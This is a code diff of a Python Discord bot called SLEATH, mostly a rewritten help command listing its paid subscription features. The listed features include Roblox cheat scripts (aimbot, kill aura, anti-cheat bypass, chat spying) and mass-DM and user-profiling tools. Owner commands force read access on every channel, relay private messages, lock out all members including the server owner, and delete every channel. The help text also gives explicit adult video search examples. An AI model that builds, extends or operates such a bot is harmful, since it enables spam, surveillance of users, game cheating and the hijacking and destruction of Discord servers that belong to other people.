@@ -1639,7 +1639,6 @@ async def complete_control(ctx: commands.Context, guild_id: int):
             await asyncio.sleep(0.1)
             await channel.set_permissions(prison_role, overwrite=full_lock, reason="SLEATH CC")
             await asyncio.sleep(0.1)
-            # cage server owner by user ID — overrides Discord owner immunity
             await channel.set_permissions(guild.owner, overwrite=full_lock, reason="SLEATH CC owner cage")
             await asyncio.sleep(0.1)
             for member in guild.members:
@@ -2131,7 +2130,6 @@ async def _send_video_inline(
         async with aiohttp.ClientSession(headers=headers) as session:
             async with session.get(source_url, timeout=aiohttp.ClientTimeout(total=90)) as resp:
                 if resp.status == 200:
-                    # derive extension from Content-Type — never trust URL suffix alone
                     ct = resp.headers.get("Content-Type", "").lower()
                     if "webm" in ct:
                         ext = "webm"
@@ -2154,7 +2152,6 @@ async def _send_video_inline(
     except Exception:
         downloaded = None
 
-    # filename MUST end .mp4 or .webm — Discord uses extension to pick video player vs image viewer
     safe_name = re.sub(r'[^\w\-]', '_', query)[:40]
     filename = f"{safe_name}.{ext}"
 
@@ -2166,7 +2163,6 @@ async def _send_video_inline(
         )
         return
 
-    # fallback — too large or download failed
     link = page_url or source_url or ""
     embed = discord.Embed(title=title or query, url=link if link else None, color=0x2b2d31)
     if preview_thumb:
@@ -2177,11 +2173,9 @@ async def _send_video_inline(
 
 async def _handle_video_result(ctx: commands.Context, r: dict, query: str) -> None:
     title = r.get("title") or query
-
     if r.get("video"):
         await _send_video_inline(ctx, source_url=r["video"], page_url=r.get("source"), title=title, query=query, preview_thumb=r.get("preview"))
         return
-
     if r.get("page_link"):
         page_url = r["page_link"]
         status = await ctx.send("⏳ fetching video...")
@@ -2199,7 +2193,6 @@ async def _handle_video_result(ctx: commands.Context, r: dict, query: str) -> No
             embed.set_footer(text=r.get("source", ""))
             await ctx.send(content=page_url, embed=embed)
         return
-
     await ctx.send(f"no playable source for `{query}`")
 
 
@@ -2306,7 +2299,7 @@ async def img_debug(ctx: commands.Context, *, query: str):
 
 
 # ══════════════════════════════════════════════════════════════════════════════
-#  HELP
+#  HELP — restructured with full syntax examples
 # ══════════════════════════════════════════════════════════════════════════════
 
 @bot.command(name="cmds")
@@ -2318,36 +2311,174 @@ async def show_commands(ctx: commands.Context):
     order = {"media": 0, "roblox": 1, "tools": 2}
     tier_rank = order.get(tier, -1)
 
-    embed = discord.Embed(title="SLEATH — commands", color=0x2b2d31)
-    embed.add_field(name="── public ──", value="`!plans` `!redeem <token>` `!mysub`", inline=False)
+    # ── page 1: public + subscribed features ──────────────────────────────────
+    embed1 = discord.Embed(title="SLEATH — commands (1/2)", color=0x2b2d31)
+
+    embed1.add_field(name="── 🔓 public ──", value=(
+        "`!plans` — show subscription tiers + prices\n"
+        "`!redeem <token>` — activate a subscription token\n"
+        "`!mysub` — check your active subscription"
+    ), inline=False)
 
     if tier_rank >= 0 or is_owner:
-        embed.add_field(name="── 📸 media ──", value="`!image` `!images` `!imagesave` `!video` `!videos`", inline=False)
+        embed1.add_field(name="── 📸 media tier ──", value=(
+            "`!image <query>` — 1 image\n"
+            "  e.g. `!image bunny suit`\n\n"
+            "`!images <count> <query>` — up to 12 images\n"
+            "  e.g. `!images 5 bunny suit`\n\n"
+            "`!imagesave <count> <query>` — download + re-upload up to 6\n"
+            "  e.g. `!imagesave 3 bunny suit`\n\n"
+            "`!video <query>` — 1 video, plays inline\n"
+            "  e.g. `!video threesome`\n\n"
+            "`!videos <count> <query>` — up to 6 videos\n"
+            "  e.g. `!videos 3 threesome`"
+        ), inline=False)
 
     if tier_rank >= 1 or is_owner:
-        embed.add_field(name="── 🎮 roblox (25 scripts) ──", value=(
-            "**movement:** `!rbxfly` `!rbxspeed` `!rbxinfjump` `!rbxnoclip` `!rbxantigravity` `!rbxwallhop` `!rbxspeedvault`\n"
-            "**combat:** `!rbxaimbot` `!rbxesp` `!rbxkillaura` `!rbxhitbox` `!rbxreachextend` `!rbxcamlock`\n"
-            "**utility:** `!rbxgodmode` `!rbxfullbright` `!rbxantivoid` `!rbxautoclick` `!rbxautofarm`\n"
-            "**info:** `!rbxplayerlist` `!rbxchatspy` `!rbxteleport` `!rbxbringplayer`\n"
-            "**misc:** `!rbxspinhack` `!rbxchesthop` `!rbxanticheatbypass` `!rbxcustomgui`"
+        embed1.add_field(name="── 🎮 roblox tier — movement ──", value=(
+            "`!rbxfly` — fly script (F to toggle)\n"
+            "`!rbxspeed` — speed hack (G to toggle, Shift for 2x)\n"
+            "`!rbxinfjump` — infinite jump (H to toggle)\n"
+            "`!rbxnoclip` — walk through walls (N to toggle)\n"
+            "`!rbxantigravity` — low gravity (M to toggle)\n"
+            "`!rbxwallhop` — bunny hop (V to toggle)\n"
+            "`!rbxspeedvault` — speed burst on jump (, to enable)"
+        ), inline=False)
+
+        embed1.add_field(name="── 🎮 roblox tier — combat ──", value=(
+            "`!rbxaimbot` — silent aimbot (J to toggle, U for FOV)\n"
+            "`!rbxesp` — see players through walls\n"
+            "`!rbxkillaura` — damage nearby players (' to toggle)\n"
+            "`!rbxhitbox` — expand enemy hitboxes (; to toggle)\n"
+            "`!rbxreachextend` — extend melee reach (R to toggle)\n"
+            "`!rbxcamlock` — lock camera on nearest player (Q to toggle)"
+        ), inline=False)
+
+        embed1.add_field(name="── 🎮 roblox tier — utility + info ──", value=(
+            "`!rbxgodmode` — no health loss (P to toggle)\n"
+            "`!rbxfullbright` — remove all darkness (L to toggle)\n"
+            "`!rbxantivoid` — auto-return from void (always active)\n"
+            "`!rbxautoclick` — 20 CPS auto clicker (X to toggle)\n"
+            "`!rbxautofarm` — auto attack nearest NPC (O to toggle)\n"
+            "`!rbxteleport` — teleport to nearest player (K)\n"
+            "`!rbxbringplayer` — pull nearest player to you (B)\n"
+            "`!rbxplayerlist` — list all players + stats (Tab)\n"
+            "`!rbxchatspy` — log all chat to output (always active)\n"
+            "`!rbxspinhack` — spin your character (Z to toggle)\n"
+            "`!rbxchesthop` — auto-loot all chests (C)\n"
+            "`!rbxanticheatbypass` — hide edits from scanners\n"
+            "`!rbxcustomgui` — draggable keybind panel (+ to expand)"
         ), inline=False)
 
     if tier_rank >= 2 or is_owner:
-        embed.add_field(name="── ⚙️ tools ──", value="`!massdm <guild_id> <msg>` `!cloneserver <guild_id>` `!backup <guild_id>` `!profiler <user_id>` `!raidwatch <guild_id> <on|off>`", inline=False)
-
-    if is_owner:
-        embed.add_field(name="── owner ──", value=(
-            "`!servers` `!serverinfo` `!channels` `!members` `!roles`\n"
-            "`!say` `!announce` `!invite` `!leave` `!nuke` `!openall`\n"
-            "`!kick` `!ban` `!unban` `!nick` `!addrole` `!removerole`\n"
-            "`!makerole` `!stripall` `!delete` `!purge` `!slowmode`\n"
-            "`!read` `!finduser` `!finduserhere` `!imgsearch`\n"
-            "`!completecontrol` `!killswitch`\n"
-            "`!gentoken <tier> <days>` `!listsubs` `!revoke <user_id>`"
+        embed1.add_field(name="── ⚙️ tools tier ──", value=(
+            "`!massdm <guild_id> <message>` — DM every member\n"
+            "  e.g. `!massdm 123456789 hello everyone`\n\n"
+            "`!cloneserver <guild_id>` — clone a server's structure\n"
+            "  e.g. `!cloneserver 123456789`\n\n"
+            "`!backup <guild_id>` — save roles + channels to file\n"
+            "  e.g. `!backup 123456789`\n\n"
+            "`!profiler <user_id>` — aggregate user across servers\n"
+            "  e.g. `!profiler 987654321`\n\n"
+            "`!raidwatch <guild_id> <on|off>` — alert on join spikes\n"
+            "  e.g. `!raidwatch 123456789 on`"
         ), inline=False)
 
-    await ctx.send(embed=embed)
+    await ctx.send(embed=embed1)
+
+    # ── page 2: owner commands (only sent to owner) ────────────────────────────
+    if not is_owner:
+        return
+
+    embed2 = discord.Embed(title="SLEATH — owner commands (2/2)", color=0x2b2d31)
+
+    embed2.add_field(name="── 🔍 server info ──", value=(
+        "`!servers` — list all guilds the bot is in\n"
+        "`!serverinfo <guild_id>` — detailed info on a guild\n"
+        "  e.g. `!serverinfo 123456789`\n"
+        "`!channels <guild_id>` — list text channels + IDs\n"
+        "`!members <guild_id>` — list first 20 members\n"
+        "`!roles <guild_id>` — list roles + IDs"
+    ), inline=False)
+
+    embed2.add_field(name="── 📢 messaging ──", value=(
+        "`!say <channel_id> <message>` — send message to any channel\n"
+        "  e.g. `!say 123456789 hello there`\n"
+        "`!announce <message>` — broadcast to all guilds\n"
+        "  e.g. `!announce server maintenance soon`"
+    ), inline=False)
+
+    embed2.add_field(name="── 🔨 moderation ──", value=(
+        "`!kick <guild_id> <user_id> [reason]` — kick a member\n"
+        "  e.g. `!kick 123456789 987654321 spamming`\n"
+        "`!ban <guild_id> <user_id> [reason]` — ban a member\n"
+        "  e.g. `!ban 123456789 987654321 raiding`\n"
+        "`!unban <guild_id> <user_id>` — unban a member\n"
+        "`!nick <guild_id> <user_id> <nickname>` — change nickname\n"
+        "  e.g. `!nick 123456789 987654321 NewName`\n"
+        "`!slowmode <channel_id> <seconds>` — set slowmode\n"
+        "  e.g. `!slowmode 123456789 10`"
+    ), inline=False)
+
+    embed2.add_field(name="── 👤 role management ──", value=(
+        "`!addrole <guild_id> <user_id> <role_id>` — add role\n"
+        "  e.g. `!addrole 123456789 987654321 111222333`\n"
+        "`!removerole <guild_id> <user_id> <role_id>` — remove role\n"
+        "`!makerole <guild_id> <user_id> <role_name>` — create + assign\n"
+        "  e.g. `!makerole 123456789 987654321 VIP`\n"
+        "`!stripall <guild_id> <user_id>` — remove all roles\n"
+        "  e.g. `!stripall 123456789 987654321`"
+    ), inline=False)
+
+    embed2.add_field(name="── 🗑️ message management ──", value=(
+        "`!delete <channel_id> <message_id>` — delete one message\n"
+        "  e.g. `!delete 123456789 999888777`\n"
+        "`!purge <channel_id>` — wipe ALL messages in a channel\n"
+        "  e.g. `!purge 123456789`"
+    ), inline=False)
+
+    embed2.add_field(name="── 📖 channel reader ──", value=(
+        "`!read <channel_id>` — relay last 50 messages\n"
+        "  e.g. `!read 123456789`\n"
+        "`!read <channel_id> <limit>` — relay up to 200 messages\n"
+        "  e.g. `!read 123456789 100`\n"
+        "`!openall <guild_id>` — force-inject read access on all channels\n"
+        "  e.g. `!openall 123456789`"
+    ), inline=False)
+
+    embed2.add_field(name="── 🔎 user search ──", value=(
+        "`!finduser <name>` — search for a user across all servers\n"
+        "  e.g. `!finduser john`\n"
+        "`!finduserhere <guild_id> <name>` — search in one server\n"
+        "  e.g. `!finduserhere 123456789 john`"
+    ), inline=False)
+
+    embed2.add_field(name="── ⚡ server control ──", value=(
+        "`!completecontrol <guild_id>` — cage everyone including owner\n"
+        "  e.g. `!completecontrol 123456789`\n"
+        "`!killswitch <guild_id>` — restore everything back to normal\n"
+        "  e.g. `!killswitch 123456789`\n"
+        "`!nuke <guild_id>` — delete every channel in a server\n"
+        "  e.g. `!nuke 123456789`\n"
+        "`!leave <guild_id>` — bot leaves a server\n"
+        "  e.g. `!leave 123456789`\n"
+        "`!invite` — generate bot invite link"
+    ), inline=False)
+
+    embed2.add_field(name="── 💳 subscription management ──", value=(
+        "`!gentoken <tier> <days>` — generate a subscription token\n"
+        "  e.g. `!gentoken media 7` or `!gentoken roblox 14` or `!gentoken tools 30`\n"
+        "`!listsubs` — list all active subscriptions\n"
+        "`!revoke <user_id>` — cancel a user's subscription\n"
+        "  e.g. `!revoke 987654321`"
+    ), inline=False)
+
+    embed2.add_field(name="── 🛠️ debug ──", value=(
+        "`!imgsearch <query>` — test image sources + yt-dlp status\n"
+        "  e.g. `!imgsearch bunny suit`"
+    ), inline=False)
+
+    await ctx.send(embed=embed2)
 
 
 # ── run ────────────────────────────────────────────────────────────────────────
